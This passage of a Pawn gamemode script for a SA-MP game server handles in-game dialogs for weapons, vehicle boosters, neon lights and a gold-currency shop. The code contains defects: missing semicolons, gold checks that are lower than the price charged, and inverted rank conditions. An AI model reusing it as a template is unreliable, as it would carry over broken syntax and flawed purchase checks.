				if(listitem == 4) { if(PINFO[playerid][pRank] <= 1) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 25,9999999); return 1; }
				if(listitem == 5) { if(PINFO[playerid][pRank] <= 2) return SCM(playerid,COLOR_ALI,"You haven't rank +3"); else GivePlayerTofang(playerid, 27,9999999); return 1; }
				if(listitem == 6) { if(PINFO[playerid][pRank] <= 3) return SCM(playerid,COLOR_ALI,"You haven't rank +4"); else GivePlayerTofang(playerid, 32,9999999); return 1; }
				if(listitem == 7) { if(PINFO[playerid][pRank] <= 3) return SCM(playerid,COLOR_ALI,"You haven't rank +4"); else GivePlayerTofang(playerid, 28,9999999); return 1; }
				if(listitem == 8) { if(PINFO[playerid][pRank] <= 4) return SCM(playerid,COLOR_ALI,"You haven't rank +5"); else GivePlayerTofang(playerid, 33,9999999); return 1; }
			}
		    else SCM(playerid,COLOR_ALI,"You are not in your HQ.");
		}
	}

	if(dialogid == DIALOG_ORDER2)
	{
		if(response)
		{
			PlayerPlaySound(playerid,1052,0.0,0.0,0.0);
			ShowPlayerDialog(playerid,DIALOG_ORDER2,DIALOG_STYLE_LIST,"{57e547}Guns","{57e547}> Full Health And Armour\n{FFFFFF}Desert Eagle \n{FFFFFF}AK-47 \n{FFFFFF}M4 \n{FFFFFF}Shotgun \n{FFFFFF}Combat Shotgun \n{FFFFFF}Tec-9 \n{FFFFFF}Micro Uzi \n{FFFFFF}Rifle ","Entekhab","Enseraf");
	    	if(PINFO[playerid][pPremiumAccount] == 2)
		    {
				if(listitem == 0) { SetPlayerZereh(playerid, 100); SetPlayerKhoon(true, playerid, 100); return 1; }
				if(listitem == 1) return GivePlayerTofang(playerid, 24,9999999);
				if(listitem == 2) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 30,9999999); return 1; }
				if(listitem == 3) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 31,9999999); return 1; }
				if(listitem == 4) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 25,9999999); return 1; }
				if(listitem == 5) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +3"); else GivePlayerTofang(playerid, 27,9999999); return 1; }
				if(listitem == 6) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +4"); else GivePlayerTofang(playerid, 32,9999999); return 1; }
				if(listitem == 7) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +4"); else GivePlayerTofang(playerid, 28,9999999); return 1; }
				if(listitem == 8) { if(PINFO[playerid][pPremiumAccount] == 2) return SCM(playerid,COLOR_ALI,"You haven't rank +5"); else GivePlayerTofang(playerid, 33,9999999); return 1; }
			}
		    else SCM(playerid,COLOR_ALI,"You are not in your HQ.");
		}
	}

	if(dialogid == 32701) {
	if(response) {
	EnableBoast[playerid] = 0;
	SCM(playerid, COLOR_YELLOW, "Speed Booster: {57e547}Disabled");
	}
	return 1;
	}
	if(dialogid == 32702) {
	if(response) {
	EnableBoast[playerid] = 1;
	SCM(playerid, COLOR_YELLOW, "Speed Booster: {00FF00}Enabled");
	}
	return 1;
	}
	if(dialogid == 32703) {
	if(response) {
	EnableBrake[playerid] = 0;
	SCM(playerid, COLOR_YELLOW, "Brake Booster: {57e547}Disabled");
	}
	return 1;
	}
	if(dialogid == 32704) {
	if(response) {
	EnableBrake[playerid] = 1;
	SCM(playerid, COLOR_YELLOW, "Brake Booster: {00FF00}Enabled");
	}
	return 1;
	}
	if(dialogid == 32700) {
	if(response) {
	if(listitem == 0) {
	if(EnableBoast[playerid] == 1) {
	ShowPlayerDialog(playerid, 32701, DIALOG_STYLE_MSGBOX, "Speed Booster", "{FFFFFF}Do you sure to {57e547}off {FFFFFF}speed booster system?", "Accept", "Close");
	}
	else {
	if(PlayerInfo[playerid][pPremiumAccount] != 2) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't premium account level 2.");
	ShowPlayerDialog(playerid, 32702, DIALOG_STYLE_MSGBOX, "Speed Booster", "{FFFFFF}Do you sure to {00FF00}on{FFFFFF} speed booster system?", "Accept", "Close");
	}
	}
	if(listitem == 1) {

	if(EnableBrake[playerid] == 1) {
	ShowPlayerDialog(playerid, 32703, DIALOG_STYLE_MSGBOX, "Brake Booster", "{FFFFFF}Do you sure to {57e547}off{FFFFFF} brake booster system?", "Accept", "Close");
	}
	else {
	if(PlayerInfo[playerid][pPremiumAccount] != 2) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't premium account level 2.");
	ShowPlayerDialog(playerid, 32704, DIALOG_STYLE_MSGBOX, "Brake Booster", "{FFFFFF}Do you sure to {00FF00}on{FFFFFF} brake booster system?", "Accept", "Close");
	}

	}
	}
	return 1;
	}

    if(dialogid == DIALOG_NEON)
    {
         switch(listitem)
    {
        case 0: //Red
        {
			new neon;
            	new vehid = GetPlayerVehicleID(playerid);
					neon = CreateObject(18648,0,0,0,0,0,0,283);
					AttachObjectToVehicle(neon, vehid, 0.2,0,0.71,0,0,0);
        }
        case 1: //Green
        {
       		SetPVarInt(playerid, "Status", 1);
 			SetPVarInt(playerid, "neon4", CreateObject(18649,0,0,0,0,0,0));
 			SetPVarInt(playerid, "neon5", CreateObject(18649,0,0,0,0,0,0));
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon4"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon5"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon installed");
        }
        case 2: //Lime
        {
        	SetPVarInt(playerid, "Status", 1);
 			SetPVarInt(playerid, "neon28", CreateObject(18649,0,0,0,0,0,0));
 			SetPVarInt(playerid, "neon29", CreateObject(18649,0,0,0,0,0,0));
 			SetPVarInt(playerid, "neon30", CreateObject(18652,0,0,0,0,0,0));
 			SetPVarInt(playerid, "neon31", CreateObject(18652,0,0,0,0,0,0));
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon28"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon29"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon30"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
 			AttachObjectToVehicle(GetPVarInt(playerid, "neon31"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon installed");
        }
        case 3: //Blue
        {
  			SetPVarInt(playerid, "Status", 1);
  			SetPVarInt(playerid, "neon", CreateObject(18648,0,0,0,0,0,0));
  			SetPVarInt(playerid, "neon1", CreateObject(18648,0,0,0,0,0,0));
  			AttachObjectToVehicle(GetPVarInt(playerid, "neon"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
  			AttachObjectToVehicle(GetPVarInt(playerid, "neon1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon installed");
        }
        case 4: //White
        {
			SetPVarInt(playerid, "Status", 1);
			SetPVarInt(playerid, "neon6", CreateObject(18652,0,0,0,0,0,0));
			SetPVarInt(playerid, "neon7", CreateObject(18652,0,0,0,0,0,0));
			AttachObjectToVehicle(GetPVarInt(playerid, "neon6"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			AttachObjectToVehicle(GetPVarInt(playerid, "neon7"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon installed");
        }
        case 5: //Violet
        {
			SetPVarInt(playerid, "Status", 1);
			SetPVarInt(playerid, "neon8", CreateObject(18651,0,0,0,0,0,0));
			SetPVarInt(playerid, "neon9", CreateObject(18651,0,0,0,0,0,0));
			AttachObjectToVehicle(GetPVarInt(playerid, "neon8"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			AttachObjectToVehicle(GetPVarInt(playerid, "neon9"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon installed");
        }
        case 6: //Remove Neon's
        {
			DestroyObject(GetPVarInt(playerid, "neon")); DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon1")); DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon2")); DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon3"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon4"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon5"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon6"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon7"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon8"));DeletePVar(playerid, "Status");
			DestroyObject(GetPVarInt(playerid, "neon9"));DeletePVar(playerid, "Status");
 			DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon28"));
 			DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon29"));
 			DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon30"));
 			DeletePVar(playerid, "Status"); DestroyObject(GetPVarInt(playerid, "neon31"));
			SendClientMessage(playerid, 0xFFFFFFAA, "Neon removed");
        }
    }
		}











		if(dialogid == 9090)
        {
            if(response)
            {
            if(listitem == 0) {
			ShowPlayerDialog(playerid, 9091, DIALOG_STYLE_MSGBOX,"Add Gold","Go to URL: http://{57e547}JoKeR GaminG {FFFFFF}.ir for buy gold.","Close","");
			return 1;
			}
			if(listitem == 1) {
		    if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		    PPA[playerid] = 1;
	     	PPD[playerid] = 7;
	    	PPG[playerid] = 200;
	    	ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Unlimited", "Do you sure to buy premium account by 200 gold?", "Accept", "Close");
			return 1;
			}
			if(listitem == 2) {
			ShowPlayerDialog(playerid, 9093, DIALOG_STYLE_LIST, "Rep Points", "{FFFFFF}100 Rep Points - {57e547}300 Gold \n{FFFFFF}500 Rep Points - {57e547}2000 Gold \n{FFFFFF}1,000 Rep Points - {57e547}3500 Gold \n{FFFFFF}2,000 Rep Points - {57e547}6000 Gold \n", "Select", "Close");
			return 1;
			}
			if(listitem == 3) {
			ShowPlayerDialog(playerid, 9094, DIALOG_STYLE_LIST, "Cash Money", "{FFFFFF}$50,000 - {57e547}200 Gold \n{FFFFFF}$100,000 - {57e547}400 Gold \n{FFFFFF}$200,000 - {57e547}780 Gold \n{FFFFFF}$500,000 - {57e547}1900 Gold \n{FFFFFF}$1,000,000 - {57e547}3800 Gold \n{FFFFFF}$5,000,000 - {57e547}19000 Gold \n", "Select", "Close");
			return 1;
			}
			if(listitem == 4) {
			ShowPlayerDialog(playerid, 9095, DIALOG_STYLE_MSGBOX, "Buy Clan", "www.jokergaming.ir {FFFFFF} for buy Clan.","Close","");
			return 1;
			}
			if(listitem == 5) {
			if(PINFO[playerid][pGold] < 50) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.")
//   			new string[128];
			if(PlayerInfo[playerid][pJailTime] >= 1)
			{
				PlayerInfo[playerid][pJailTime] = 1;//Nemikhad save she
				Mahal[playerid] = 9999;
				TooHouse[playerid] = 9999;
				TooBiz[playerid] = 9999;
				PINFO[playerid][pGold] -= 50;
	        	SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
			return 1;
			}
			}
			if(listitem == 6) {
			if(PINFO[playerid][pPunish] < 10) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't +10 faction punish to clear.")
			if(PINFO[playerid][pGold] < 50) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.")
			ShowPlayerDialog(playerid, 9097, DIALOG_STYLE_MSGBOX,"Clear 10 FP","Do you sure clear your 10 faction punish by 50 golds?","Yes","Close");
			return 1;
			}
			if(listitem == 7) {
			if(PINFO[playerid][pGold] < 300) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.")
			ShowPlayerDialog(playerid, 9098, DIALOG_STYLE_INPUT,"Change Nickname","Insert your new nickname.\n{57e547}There isn't back way.","Accept","Close");
			return 1;
			}
			if(listitem == 8) {
			if(PINFO[playerid][pWarns] < 1) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't warn.")
			if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.")
			ShowPlayerDialog(playerid, 9099, DIALOG_STYLE_MSGBOX,"Clear 1 Warn","Do you sure clear your 1 warn by 200 golds?","Yes","Close");
			return 1;
			}
			if(listitem == 9) {
			if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.")
			if(PlayerInfo[playerid][pSex] == 1) {
			pSexx[playerid] = 2;
			ShowPlayerDialog(playerid, 9089, DIALOG_STYLE_MSGBOX,"Change Sex","Do you sure change your sex to female by 200 golds?","Yes","Close");
			}
			else if(PlayerInfo[playerid][pSex] == 2) {
			pSexx[playerid] = 1;
			ShowPlayerDialog(playerid, 9089, DIALOG_STYLE_MSGBOX,"Change Sex","Do you sure change your sex to male by 200 golds?","Yes","Close");
			}

			return 1;
			}
            }
            else
            {
            return 1;
            }
        }
		if(dialogid == 9098) {
		if(response) {
		if(FindBadSign(inputtext)) {
		SCM(playerid,COLOR_GG,"Use A-Z a-z 0-9 in NewName");
		ShowPlayerDialog(playerid, 9098, DIALOG_STYLE_INPUT,"Change Nickname","Insert your new nickname.\n{57e547}There isn't back way.","Accept","Close");
		return 1;
		}
        gPlayerLogged[playerid] = 0;
        RequestSelected[playerid] = true;
        new query[300];
        format(query,300,"SELECT * FROM `users` WHERE pName='%s'",inputtext);
        mysql_function_query(handle,query,true,"OnPlayerChangeNameShop","iiss",playerid,playerid,PINFO[playerid][pName],inputtext);


		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9097) {
		if(response) {
		PINFO[playerid][pPunish] -= 10;
		SaveKonVal(playerid, "pPunish", PINFO[playerid][pPunish]);
		PINFO[playerid][pGold] -= 50;
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		SCM(playerid, COLOR_YELLOW, "[Shop]: your 10 FactionPunish has been cleared by 50 golds succeefully.");
		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9099) {
		if(response) {
		PINFO[playerid][pWarns] -= 1;
		SaveKonVal(playerid, "pWarns", PINFO[playerid][pWarns]);
		PINFO[playerid][pGold] -= 200;
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		SCM(playerid, COLOR_YELLOW, "[Shop]: your 1 warn has been cleared by 200 golds succeefully.");
		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9089) {
		if(response) {
		PINFO[playerid][pSex] = pSexx[playerid];
		SaveKonVal(playerid, "pSex", pSexx[playerid]);
		PINFO[playerid][pGold] -= 200;
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		SCM(playerid, COLOR_YELLOW, "[Shop]: your sex succeefully changed by 200 golds.");
		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9095) {
		if(response) {
		if(listitem == 0) {
		if(PINFO[playerid][pClan] < 0) return SCM(playerid, COLOR_YELLOW2, "Error: you cannot create a clan when you are in a clan.");
		if(PINFO[playerid][pGold] < 500) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CCID[playerid] = 1;
		ShowPlayerDialog(playerid,9025,DIALOG_STYLE_INPUT,"Small Clan [5 Slots] [30Days]","Enter your clan name - length: 5-20 word. {57e547}cant change it.","Next","Cancel");
		return 1;
		}
		if(listitem == 1) {
		if(PINFO[playerid][pGold] < 1000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CCID[playerid] = 2;
		ShowPlayerDialog(playerid,9025,DIALOG_STYLE_INPUT,"Medium Clan [10 Slots] [30Days]","Enter your clan name - length: 5-20 word. {57e547}cant change it.","Next","Cancel");
		return 1;
		}
		if(listitem == 2) {
		if(PINFO[playerid][pGold] < 2000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CCID[playerid] = 3;
		ShowPlayerDialog(playerid,9025,DIALOG_STYLE_INPUT,"Big Clan [15 Slots] [30Days]","Enter your clan name - length: 5-20 word. {57e547}cant change it.","Next","Cancel");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9025) {
		if(response) {
		if(strlen(inputtext) < 5 || strlen(inputtext) > 20) {
		ShowPlayerDialog(playerid,9025,DIALOG_STYLE_INPUT,"Error","There is a error! Enter your clan name - length: 5-20 word. {57e547}cant change it.","Next","Cancel");
		return 1;
		}
		new str[512];
		format(str, sizeof(str), "%s",inputtext);
		NameClan[playerid] = str;
		ShowPlayerDialog(playerid,9026,DIALOG_STYLE_INPUT,"Clan Tag","Enter your clan tag - length: 2-5 word. {57e547}cant change it.","Next","Cancel");
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9026) {
		if(response) {
		if(strlen(inputtext) < 2 || strlen(inputtext) > 5) {
		ShowPlayerDialog(playerid,9026,DIALOG_STYLE_INPUT,"Error","There is a error! Enter your clan tag - length: 2-5 word. {57e547}cant change it.","Next","Cancel");
		return 1;
		}
		new str[512];
		format(str, sizeof(str), "%s",inputtext);
		TagClan[playerid] = str;
		ShowPlayerDialog(playerid,9027,DIALOG_STYLE_LIST,"Clan BB","Before (Example: [TPG]NAME) \nAfter (Example: NAME[TPG])","Next","Cancel");
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9027) {
		if(response) {
		if(listitem == 0) {
		CBB[playerid] = 1;
		ShowPlayerDialog(playerid,9028,DIALOG_STYLE_INPUT,"Clan Color","Warning: you should set a correct color. get that from WwW.Color.{57e547}JoKeR GaminG {FFFFFF}.com before create clan.","Next","Cancel");
		return 1;
		}
		if(listitem == 1) {
		CBB[playerid] = 2;
		ShowPlayerDialog(playerid,9028,DIALOG_STYLE_INPUT,"Clan Color","Warning: you should set a correct color. get that from WwW.Color.{57e547}JoKeR GaminG {FFFFFF} before create clan.","Next","Cancel");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9028) {
		if(response) {
		if(strlen(inputtext) != 6 ) {
		ShowPlayerDialog(playerid,9028,DIALOG_STYLE_INPUT,"Clan Color","Warning: you should set a correct color. get that from {57e547}JoKeR GaminG {FFFFFF}.com before create clan.","Next","Cancel");
		return 1;
		}
		new str[512];
		format(str, sizeof(str), "%s",inputtext);
		ColorClan[playerid] = str;
		new sss[512];
		format(sss, sizeof(sss), "do you sure make clan with {FFFFFF}Name: [{%s}%s{FFFFFF}] Tag: [{%s}%s{FFFFFF}] for 30 days?", ColorClan[playerid], NameClan[playerid], ColorClan[playerid], TagClan[playerid]);
		ShowPlayerDialog(playerid,9029,DIALOG_STYLE_MSGBOX,"Clan Accept",sss,"Yes","Cancel");
		}
		else {
		return 1;
		}
		}
	/*	if(dialogid == 9029) {
		new string[256];
		if(response) {
		return 1;
		}
		else {
		return 1;
		}
		}*/
		if(dialogid == 9093) {
		if(response) {
		if(listitem == 0) {
		if(PINFO[playerid][pGold] < 300) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		RRP[playerid] = 100;
		RRG[playerid] = 300;
		ShowPlayerDialog(playerid, 9065, DIALOG_STYLE_MSGBOX, "Buy Rep Points", "Do you sure to buy 100 Rep points by 300 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 1) {
		if(PINFO[playerid][pGold] < 2000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		RRP[playerid] = 500;
		RRG[playerid] = 2000;
		ShowPlayerDialog(playerid, 9065, DIALOG_STYLE_MSGBOX, "Buy Rep Points", "Do you sure to buy 500 Rep points by 2000 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 2) {
		if(PINFO[playerid][pGold] < 3500) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		RRP[playerid] = 1000;
		RRG[playerid] = 3500;
		ShowPlayerDialog(playerid, 9065, DIALOG_STYLE_MSGBOX, "Buy Rep Points", "Do you sure to buy 1000 Rep points by 3500 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 3) {
		if(PINFO[playerid][pGold] < 6000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		RRP[playerid] = 2000;
		RRG[playerid] = 6000;
		ShowPlayerDialog(playerid, 9065, DIALOG_STYLE_MSGBOX, "Buy Rep Points", "Do you sure to buy 2000 Rep points by 6000 gold?", "Accept", "Close");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9094) {
		if(response) {
		if(listitem == 0) {
		if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 50000;
		CMG[playerid] = 200;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		if(listitem == 1) {
		if(PINFO[playerid][pGold] < 400) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 100000;
		CMG[playerid] = 400;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		if(listitem == 2) {
		if(PINFO[playerid][pGold] < 1000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 200000;
		CMG[playerid] = 780;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		if(listitem == 3) {
		if(PINFO[playerid][pGold] < 2000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 500000;
		CMG[playerid] = 1900;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		if(listitem == 4) {
		if(PINFO[playerid][pGold] < 4000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 1000000;
		CMG[playerid] = 3800;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		if(listitem == 5) {
		if(PINFO[playerid][pGold] < 20000) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		CMP[playerid] = 5000000;
		CMG[playerid] = 19000;
		new strr[256];
		format(strr, sizeof(strr), "Do you sure to buy $%s by %d gold?",FormatNumber(CMP[playerid]),CMG[playerid]);
		ShowPlayerDialog(playerid, 9064, DIALOG_STYLE_MSGBOX, "Buy Cash Money", strr, "Accept", "Close");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9092) {
		if(response) {
		if(listitem == 0) {
		ShowPlayerDialog(playerid, 9082, DIALOG_STYLE_LIST, "Premium Account [1]", "{FFFFFF}1 Week (7 days) limit - {57e547}50 Gold \n{FFFFFF}1 Month (30 days) limit - {57e547}200 Gold \n{FFFFFF}3 Months (90 days) limit - {57e547}600 Gold \n{FFFFFF}6 Months (180 days) limit - {57e547}1200 Gold \n{FFFFFF}1 Year (365 days) limit - {57e547}2300 Gold", "Select", "Close");
		return 1;
		}
		if(listitem == 1) {
		ShowPlayerDialog(playerid, 9072, DIALOG_STYLE_LIST, "Premium Account [2]", "{FFFFFF}1 Week (7 days) limit - {57e547}80 Gold \n{FFFFFF}1 Month (30 days) limit - {57e547}320 Gold \n{FFFFFF}3 Months (90 days) limit - {57e547}900 Gold \n{FFFFFF}6 Months (180 days) limit - {57e547}1780 Gold \n{FFFFFF}1 Year (365 days) limit - {57e547}3000 Gold", "Select", "Close");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9082) {
		if(response) {
		if(listitem == 0) {
		if(PINFO[playerid][pGold] < 50) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 1;
		PPD[playerid] = 7;
		PPG[playerid] = 50;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [1]", "Do you sure to buy premium account level [1] for 1 week by 50 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 1) {
		if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 1;
		PPD[playerid] = 30;
		PPG[playerid] = 200;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [1]", "Do you sure to buy premium account level [1] for 1 month by 200 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 2) {
		if(PINFO[playerid][pGold] < 600) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 1;
		PPD[playerid] = 90;
		PPG[playerid] = 600;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [1]", "Do you sure to buy premium account level [1] for 3 months by 600 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 3) {
		if(PINFO[playerid][pGold] < 1200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 1;
		PPD[playerid] = 180;
		PPG[playerid] = 1200;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [1]", "Do you sure to buy premium account level [1] for 6 months by 1200 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 4) {
		if(PINFO[playerid][pGold] < 2300) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 1;
		PPD[playerid] = 365;
		PPG[playerid] = 2300;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [1]", "Do you sure to buy premium account level [1] for 1 year by 2300 gold?", "Accept", "Close");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9072) {
		if(response) {
		if(listitem == 0) {
		if(PINFO[playerid][pGold] < 80) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 2;
		PPD[playerid] = 7;
		PPG[playerid] = 80;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [2]", "Do you sure to buy premium account level [2] for 1 week by 80 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 1) {
		if(PINFO[playerid][pGold] < 200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 2;
		PPD[playerid] = 30;
		PPG[playerid] = 320;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [2]", "Do you sure to buy premium account level [2] for 1 month by 320 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 2) {
		if(PINFO[playerid][pGold] < 600) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 2;
		PPD[playerid] = 90;
		PPG[playerid] = 900;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [2]", "Do you sure to buy premium account level [2] for 3 months by 900 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 3) {
		if(PINFO[playerid][pGold] < 1200) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 2;
		PPD[playerid] = 180;
		PPG[playerid] = 1780;
		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [2]", "Do you sure to buy premium account level [2] for 6 months by 1780 gold?", "Accept", "Close");
		return 1;
		}
		if(listitem == 4) {
		if(PINFO[playerid][pGold] < 2300) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't enough gold.");
		PPA[playerid] = 2;
		PPD[playerid] = 365;
		PPG[playerid] = 3000;
